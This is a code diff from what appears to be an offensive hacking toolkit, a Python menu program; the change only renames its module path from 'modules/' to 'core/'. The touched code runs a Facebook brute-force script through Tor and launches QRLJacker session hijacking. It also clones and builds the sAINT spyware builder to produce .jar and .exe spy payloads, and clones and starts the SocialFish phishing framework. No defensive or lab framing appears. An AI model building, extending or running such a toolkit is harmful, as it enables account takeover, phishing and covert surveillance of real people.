@@ -1,8 +1,8 @@
 from colorama import Fore, init
-import modules.PayloadGenerate as PayloadGenerate
-import modules.camHackers as camHackers
-import modules.UrlHider as UrlHider
-import modules.banners
+import core.PayloadGenerate as PayloadGenerate
+import core.camHackers as camHackers
+import core.UrlHider as UrlHider
+import banners
 import subprocess
 import ipinfo
 import shodan
@@ -353,13 +353,13 @@ def mainBruteForece():
         option1 = input(str(" {} ({}BruteForce/Facebook{}) > ".format(ProgramName, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX)))
 
         if option1 == '01' or option1 == '1':
-            os.system("sudo chmod +x modules/FB-BruteForce/FacebookBruteForce.sh")
+            os.system("sudo chmod +x core/FB-BruteForce/FacebookBruteForce.sh")
             os.system("sudo service tor start")
-            os.system("sudo ./modules/FB-BruteForce/FacebookBruteForce.sh")
+            os.system("sudo ./core/FB-BruteForce/FacebookBruteForce.sh")
             mainBruteForece()
         
         elif option1 == '02' or option1 == '2':
-            os.system("sudo ./modules/FB-BruteForce/FacebookBruteForce.sh --resume")
+            os.system("sudo ./core/FB-BruteForce/FacebookBruteForce.sh --resume")
             if PrintBanners == True:
                 banners.println(6)
             mainBruteForece()
@@ -413,7 +413,7 @@ def mainExploits():
         print("")
         time.sleep(1)
         #os.system("xterm -hold -e firefox z0172ck.me")
-        os.system("cd modules/QRLJacker/ && python3 QrlJacker.py -q -r .ataque")
+        os.system("cd core/QRLJacker/ && python3 QrlJacker.py -q -r .ataque")
 
         mainExploits()
 
@@ -494,7 +494,7 @@ def mainSearchEngines():
 
     if option == '01'  or option == '1':
         name = input(str(" {} ({}UserNameSE/Namechk{}) Name > ".format(ProgramName, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX)))
-        os.system(f"bash ./modules/Namechk/namechk.sh {name} -fu")
+        os.system(f"bash ./core/Namechk/namechk.sh {name} -fu")
         mainUserSearchEngines()
     
     elif option == '99':
@@ -519,14 +519,14 @@ def mainSpy():
 
     if options == '1' or options == '01':
         print("")
-        if os.path.exists('modules/sAINT') == False:
-            os.system("cd modules/ && git clone https://github.com/tiagorlampert/sAINT && cd sAINT && chmod +x configure.sh && sudo ./configure.sh ")
+        if os.path.exists('core/sAINT') == False:
+            os.system("cd core/ && git clone https://github.com/tiagorlampert/sAINT && cd sAINT && chmod +x configure.sh && sudo ./configure.sh ")
         
-        os.system("cd modules/sAINT && sudo java -jar sAINT.jar")
+        os.system("cd core/sAINT && sudo java -jar sAINT.jar")
         print("\n\n")
         print("Spy Saved in {}result/sAINT{}.jar an .exe".format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX))
-        os.system("sudo cp modules/sAINT/target/saint-1.0-jar-with-dependencies.jar result/sAINT.jar")
-        os.system("sudo cp modules/sAINT/target/saint-1.0-jar-with-dependencies.exe result/sAINT.exe")
+        os.system("sudo cp core/sAINT/target/saint-1.0-jar-with-dependencies.jar result/sAINT.jar")
+        os.system("sudo cp core/sAINT/target/saint-1.0-jar-with-dependencies.exe result/sAINT.exe")
         mainSpy()
 
     elif options == '99':
@@ -547,13 +547,13 @@ def mainPhishing():
     options = input(str(" {} ({}Phishing{}) > ".format(ProgramName, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX)))
 
     if options == '01' or options == '1':
-        if os.path.exists("modules/SocialFish/") == False:
-            os.system("cd modules/ && git clone https://github.com/UndeadSec/SocialFish")
+        if os.path.exists("core/SocialFish/") == False:
+            os.system("cd core/ && git clone https://github.com/UndeadSec/SocialFish")
             print("Ok")
 
         print("")
         try:
-            os.system("cd modules/SocialFish/ && sudo python3 SocialFish.py admin admin && echo Ok")
+            os.system("cd core/SocialFish/ && sudo python3 SocialFish.py admin admin && echo Ok")
         except KeyboardInterrupt:
             mainPhishing()
 
